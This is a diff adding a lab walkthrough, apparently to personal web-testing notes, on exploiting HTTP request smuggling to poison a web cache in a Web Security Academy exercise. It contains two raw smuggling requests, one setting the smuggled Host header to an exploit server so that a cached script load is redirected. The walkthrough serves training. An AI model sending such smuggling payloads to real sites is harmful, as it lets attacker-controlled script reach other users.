@@ -614,6 +614,79 @@ Copy the victim session cookie and replace it and you should be able to delete u
 
 ![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/bda93fb2-7a00-4e2e-8ce7-97ab1efff61c)
 
+**Exploiting HTTP request smuggling to perform web cache poisoning**
+
+Capture a request to next post  and smuggled request with different host header
+
+```
+POST / HTTP/1.1
+Host: 0a12004404739ba183c707a400300006.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 135
+Transfer-Encoding: chunked
+
+0
+
+GET /post/next?postId=4 HTTP/1.1
+Host: ANYTHING
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+```
+
+Our  location got redirected to a host of our choice 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7ca4d145-8acb-4e40-9414-e2d15314a0fe)
+
+
+
+On our exploit server 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/fbb03e4f-562c-4b7d-b47f-e0052c8c9601)
+
+
+Change our ANYTHING host to our exploit server and intercept a request from /resources/js/tracking.js
+Add both to group and Separate connection for each request
+
+```
+POST / HTTP/1.1
+Host: 0af500e903aec00281f025d700c80007.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 180
+Transfer-Encoding: chunked
+
+0
+
+GET /post/next?postId=3 HTTP/1.1
+Host: exploit-0a8100e9036bc025811d243a016e009e.exploit-server.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+```
+
+Send group
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/74402595-d086-4610-a9d5-1c99f6379ff9)
+
+
+
+
+
+Notice host changed to our exploit server on Location
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/32589dcc-a024-499b-8c49-be751972079e)
+
+
+
+
+
+
+Should get an alert textbox when we refresh site
+
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/ac612921-6dbb-4fbf-9df2-be98df4f6a19)
+
+
+
+
+
 
 
 
